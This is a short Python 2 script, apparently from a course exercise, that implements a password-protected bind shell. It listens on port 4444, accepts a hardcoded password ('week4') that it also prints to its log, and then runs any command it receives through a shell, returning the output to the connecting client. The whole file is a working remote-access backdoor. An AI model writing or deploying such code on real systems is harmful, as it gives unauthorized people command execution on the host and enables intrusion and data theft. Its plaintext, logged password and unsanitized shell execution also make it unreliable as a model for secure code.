import socket
import subprocess

HOST = ''
PORT = 4444
EXPECTED_PASSWORD = "week4"

def start_server():
    print("[SERVER] Initializing...")
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print("[SERVER] Waiting for connection...")

    while True:
        print("[SERVER] Waiting for client connection...")
        try:
            client, address = server.accept()
            print("[SERVER] Connected to %s" % str(address))
        except Exception as e:
            print("[SERVER ERROR] While accepting connection: %s" % str(e))
            continue

        try:
            data = client.recv(1024)
            password = data.strip()
            print("[LOGIN ATTEMPT] Password received: '%s'" % password)
        except Exception as e:
            print("[SERVER ERROR] During password receive or decode: %s" % str(e))
            client.close()
            continue

        if password.lower() == EXPECTED_PASSWORD.lower():
            try:
                client.send("success")
                print("[SERVER] Login successful.")
                handle_client(client)
            except Exception as e:
                print("[SERVER ERROR] While sending success or starting command loop: %s" % str(e))
                client.close()
        else:
            try:
                client.send("fail")
                print("[SERVER] Login failed. Expected: '%s', Got: '%s'" % (EXPECTED_PASSWORD, password))
            except Exception as e:
                print("[SERVER ERROR] While sending fail: %s" % str(e))
            client.close()

def handle_client(client):
    while True:
        try:
            print("[SERVER] Waiting for command...")
            command = client.recv(1024).strip()
            print("[SERVER] Command received: '%s'" % command)

            if not command or command.lower() == 'exit':
                break

            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            response = out + err
            if not response:
                response = "no stdout"

            client.send(response)
            print("[SERVER] Response sent.")
        except Exception as e:
            print("[COMMAND ERROR] %s" % str(e))
            break

    client.close()
    print("[SERVER] Client disconnected.")

if __name__ == "__main__":
    start_server()
